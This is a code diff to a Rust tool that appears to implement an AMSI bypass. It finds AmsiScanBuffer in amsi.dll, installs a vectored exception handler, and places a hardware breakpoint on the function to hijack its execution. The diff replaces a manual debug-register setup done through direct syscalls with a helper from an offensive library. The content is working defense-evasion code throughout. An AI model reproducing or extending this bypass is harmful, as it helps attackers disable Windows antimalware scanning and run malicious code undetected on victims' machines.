@@ -18,7 +18,8 @@ use winapi::{
 };
 
 use thermite::{direct_syscall, error, info};
-use thermite::breakpoints::{DebugRegister, get_arguments, register_callback, rip_to_return_address, set_resume_flag, set_ret_value};
+use thermite::breakpoints::{DebugRegister, get_arguments, rip_to_return_address, set_breakpoint, set_resume_flag, set_ret_value};
+use thermite::enumeration::get_thread_id;
 use thermite::peb_walk::{get_function_address, get_module_handle};
 
 
@@ -37,11 +38,6 @@ extern "system" {
 // Then set up a hook with hardware breakpoints at the function's address, so we can hijack the execution
 fn setup() -> Result<*mut c_void, String> {
 	let amsiscanbuffer_handle: *const u8;
-	let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
-	thread_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	
-	let status = direct_syscall!("NtGetContextThread", -2i32 as HANDLE, &mut thread_ctx);
-	if status != 0 { return Err(format!("Failed to get context thread: {status:x}")) };
 
 	unsafe {
 		let module_name = CString::new("amsi.dll").unwrap();
@@ -50,22 +46,11 @@ fn setup() -> Result<*mut c_void, String> {
 		if amsiscanbuffer_handle.is_null() { return Err("Failed to get AmsiScanBuffer address".to_string()) };
 	}
 
-	// We register our VEH, i just use the one i made in thermite::breakpoints, no reason to change something that works
 	let veh = unsafe { AddVectoredExceptionHandler(1, Some(thermite::breakpoints::vectored_handler)) };
 	if veh.is_null() { return Err("Failed to add exception handler".to_string()) };
+	
+	unsafe { set_breakpoint(DebugRegister::DR0, amsiscanbuffer_handle, transmute(callback as fn(_)), get_thread_id()) };
 
-	// No idea why, but NtGetContextThread (on line 57) fails when i use this function
-	// Fails with status 0x80000002 which is STATUS_DATATYPE_MISALIGNMENT - but there is no changes in alignment of anything ... super weird 
-	// unsafe { set_breakpoint(DebugRegister::DR0, amsiscanbuffer_handle, &mut thread_ctx, transmute(callback as fn(_))) };
-
-	// So fuck it let's set up the breakpoint manually then (it does exactly the same stuff than set_breakpoint() .... )
-	thread_ctx.Dr0 = amsiscanbuffer_handle as u64;
-	thread_ctx.Dr7 |= 1;
-	unsafe { register_callback(DebugRegister::DR0, transmute(callback as fn(_))); }
-
-	// Set the context - "Saves" our breakpoints
-	let status = direct_syscall!("NtSetContextThread", -2isize, &mut thread_ctx);
-	if status != 0 { return Err(format!("Failed to set context thread: {status:x}")) };
 	Ok(veh)
 }
 
